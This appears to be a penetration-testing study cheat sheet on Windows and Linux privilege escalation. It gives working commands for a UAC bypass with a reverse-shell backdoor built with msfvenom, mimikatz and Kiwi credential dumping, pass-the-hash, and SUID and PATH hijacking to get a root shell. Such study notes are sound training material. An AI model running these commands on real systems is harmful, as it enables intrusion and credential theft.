# Privilege Escalation

## <mark style="color:purple;">Windows</mark>

{% hint style="info" %}
**Note**: if you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM.
{% endhint %}

### <mark style="color:purple;">Automation script</mark>

```batch
:: https://github.com/itm4n/PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### <mark style="color:purple;">UAC Bypass</mark>

User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.

Prerequisites:

1. User must be a member of the Administrators group. `net localgroup administrators`
2. Full interactive shell with the victim like meterpreter (a common nc.exe shell is not enough).

**(1) Metasploit**

```sh
search bypassuac
```

**(2) UACME**

```sh
# 1. Step
ps
migrate <PID explorer.exe>

# 2. Step - Upload Akagi (Akagi64.exe if x64)

# 3. Step - Create payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe

# 4. Step - Start a listener (exploit/multi/handler)

# 5. Step - Run Akagi
Akagi64.exe 23 <payload_full_path> # NOTE FULL PATH

# Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
```

### <mark style="color:purple;">Impersonate Tokens</mark>

**Metasploit - incognito**

```sh
load incognito
list_tokens -u
```

```
 Delegation Tokens Available
 ========================================
 ATTACKDEFENSE\Administrator
 NT AUTHORITY\LOCAL SERVICE
 
 Impersonation Tokens Available
 ========================================
 No tokens available
```

```sh
impersonate_token <token_name>
# Ex: impersonate_token ANYTHING\\Administrator 
# Note: the two backslashes
```

```sh
# You may need to migrate process to a <user> process
getpid
ps     
# PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANYTHING\Administrator | PATH: C:\Windows\explorer.exe

# Migrate process
migrate 2948
```

### <mark style="color:purple;">Password in configuration file (Unattend.xml)</mark>

An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.

```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.xml
C:\Windows\system32\sysprep\sysprep.xml
```

Extract password and decode it (from base64)

### <mark style="color:purple;">Credential Dumping (Mimikatz - Kiwi - Hashdump)</mark>

Prerequisites: User must be a member a local Administrators.

**(1) hashdump (Metasploit - Meterpreter)**

```sh
# You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
migrate <PID explorer.exe>
hashdump
```

**(2) Kiwi (Metasploit - Meterpreter)**

```sh
# You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process
migrate <PID explorer.exe>

load kiwi
# Retrieve all credentials (parsed)
creds_all 
# NTLM hashes for all of the user accounts on the system
lsa_dump_sam
# Find the clear text passwords
lsa_dump_secrets
# Note: from the Windows version 8.0+, windows don’t store any plain text password.
# So, it can be helpful for the older version of the Windows.
```

**(3) Mimikatz**

```batch
# 1. Upload mimikatz.exe

# 2. Execute
mimkatz.exe

:: Get debug rights. This should be a standard for running mimikatz as it needs local administrator access
:: This should return Privilege '20' OK.
privilege::debug 

:: NTLM hashes for all of the user accounts on the system
lsadump::sam
:: To find the clear text passwords, but it's not always possible
sekurlsa::logonpasswords  
```

### <mark style="color:purple;">Pass the Hash</mark>

```sh
# 1. Method
crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"

# 2. Method (Metasploit) -> windows/smb/psexec
set SMBPass <LM hash>:<NTLM hash>
```

{% hint style="info" %}
**Notes**:

* Empty LM hash: `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
  * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
* With `hashdump` you have the right format
{% endhint %}

### <mark style="color:purple;">Other</mark>

* Powershell History
* Saved Windows Credentials
  * cmdkey /list
  * runas /savecred /user:admin cmd.exe
* Scheduled Tasks
* Insecure Permissions on Service Executable
* Unquoted Service Paths
* Insecure Service Permissions
* Windows Privileges
* Unpatched Software

## <mark style="color:purple;">Linux</mark>

### <mark style="color:purple;">Vulnerable program</mark>

Search scripts that execute programs or programs. Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)

```sh
ps aux
```

### <mark style="color:purple;">Weak Permissions</mark>

<pre class="language-sh"><code class="lang-sh"><strong># World-writable files - Ex: maybe you can edit shadow file
</strong><strong>find / -not -type l -perm -o+w
</strong></code></pre>

### <mark style="color:purple;">Sudo</mark>

<pre class="language-sh"><code class="lang-sh">sudo -l
<strong># Search on https://gtfobins.github.io/ how to exploit
</strong></code></pre>

### <mark style="color:purple;">SUID - custom binary</mark>

Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`

Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime

```sh
strings binary_name
```

**(1) Method**

```sh
cp /bin/bash /path/to/loaded_binary
```

**(2) Method**

Delete the loaded binary and replace with a new one:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/bash -i"); 
    return 0;
}
```

```sh
# Compile
gcc binary.c -o <loaded_binary>
# Run the binary
./binary_name
```

### <mark style="color:purple;">Other</mark>

* `sudo -l`
  * setenv?
* SUID/GUID
* Look for capabilities
* History Files
* Docker group
* Cron jobs
* SSH Keys
* PATH
* NFS
* Writable /etc/shadow
* Writable /etc/passwd
* Are there scripts that use commands?
  * If the command is executed without full path you can modify PATH variable
  * `strings <program_name>`
  * you see `tail -f /var/log/nginx/access.log`
  * ```
    #!/bin/bash
    /bin/bash -p
    ```
  * `chmod +x /tmp/tail`
  * `export PATH=/tmp:$PATH`
  * `./<program_name>`
* Is there a database? Can I access to it?
  * Look at config file or source code of webpages connecting to db
* Look at the source code of the php,py,jsp ... files of the website
  * Especially login files. Any password?
* Writable authorized\_key folder?
  * generate new ssh keys
* Can I read some file with sudo?
  * /root/root.txt, /etc/shadow, /root/.ssh/id\_rsa
* Can I write a file in the root user directory?
  * generate ssh key with ssh-keygen and save it in the root user dir
* Kernel Exploits
* Linpeas.sh
* [GTFObins](https://gtfobins.github.io)
